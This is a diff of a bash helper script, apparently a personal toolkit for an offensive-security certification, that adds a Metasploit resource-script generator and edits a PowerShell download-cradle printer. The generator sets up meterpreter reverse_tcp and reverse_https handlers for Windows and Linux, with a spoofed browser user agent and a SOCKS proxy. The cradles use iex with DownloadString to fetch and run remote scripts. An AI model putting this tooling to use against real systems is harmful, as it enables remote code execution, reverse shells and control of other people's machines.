@@ -247,9 +247,10 @@ function iexurls(){
                 DIR_PATH=$3
                 find $DIR_PATH -name "*.ps1" | while read SCRIPT_PATH 
                         do
+
                                 DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
                                 # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/$USER\/OSEP//g"
+                                echo $DOWNLOAD_CRADLE | sed "s*/$DIR_PATH**g"
                                 # echo "$DOWNLOAD_CRADLE_OBFS"
                                 echo "\n"
                         done
@@ -584,6 +585,80 @@ function oseppayloads(){
         fi
         rm $PAYLOAD_PATH/*.py
         cd $CURR_PWD
+}
+
+echo -e "${YELLOW}${BOLD}\n========================${NC}"
+echo -e "${YELLOW}${BOLD}[ - Metasploit - ]${NC}"
+echo -e "${YELLOW}${BOLD}========================${NC}"
+echo "resourcescript - Start metasploit with dynamic settings - resourcescript <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX>"
+function resourcescript(){
+        CURR_PWD=`pwd`
+        if [ $# -eq 5 ];then
+                INTERFACE=$1
+                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
+                HTTPS_PORT=$2
+                TCP_PORT=$3
+                HTTPS_PORT_LINUX=$4
+                TCP_PORT_LINUX=$5
+                
+                echo "db_connect -y /usr/share/metasploit-framework/config/database.yml"
+                echo -n "Workspace: "
+                read WORKSPACE
+                mkdir -pv logs
+
+                echo "Metasploit resource script"
+                echo "============================================================================================================================================"
+                echo "spool logs/metasploit.log"
+                echo "date"
+                
+                echo "workspace -a $WORKSPACE"
+                echo "workspace $WORKSPACE"
+                echo "use exploit/multi/handler"
+                echo "setg payload windows/x64/meterpreter/reverse_tcp"
+                echo "setg LHOST $INTERFACE" 
+                echo "setg lport $TCP_PORT"
+                echo "setg ExitOnSession false"
+                echo "options"
+                echo "exploit -j -z"
+                echo "use exploit/multi/handler"
+                echo "setg payload windows/x64/meterpreter/reverse_https"
+                echo "setg LHOST $INTERFACE"
+                echo "setg lport $HTTPS_PORT"
+                echo "setg ExitOnSession false"
+                echo "set HandlerSSLCert /opt/ssl/server.pem"
+                echo "setg HttpUserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44'"
+                echo "setg StagerVerifySSLCert true"
+                echo "options"
+                echo "exploit -j -z"
+                echo "set payload linux/x64/meterpreter_reverse_https"
+                echo "set LHOST $INTERFACE"
+                echo "setg lport $HTTPS_PORT_LINUX"
+                echo "set ExitOnSession false"
+                echo "set HandlerSSLCert /opt/ssl/server.pem"
+                echo "setg HttpUserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44'"
+                echo "set StagerVerifySSLCert true"
+                echo "options"
+                echo "exploit -j -z"
+                echo "use exploit/multi/handler"
+                echo "set payload linux/x64/meterpreter/reverse_tcp"
+                echo "set LHOST $INTERFACE"
+                echo "set lport $TCP_PORT_LINUX"
+                echo "set ExitOnSession false"
+                echo "options"
+                echo "exploit -j -z"
+                echo "use auxiliary/server/socks_proxy"
+                echo "set SRVHOST 0.0.0.0"
+                echo "set SRVPORT 1084"
+                echo "options"
+                echo "exploit -j -z"
+                echo 'hosts -C "address,name,service_count,comments"'
+                echo "services"
+                echo "creds"
+                echo "============================================================================================================================================"
+                echo " "
+        else
+                echo -e "${RED}Please the interface and port you want to listen - metasploitstart <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX>${NC}"
+        fi
 }
 
 
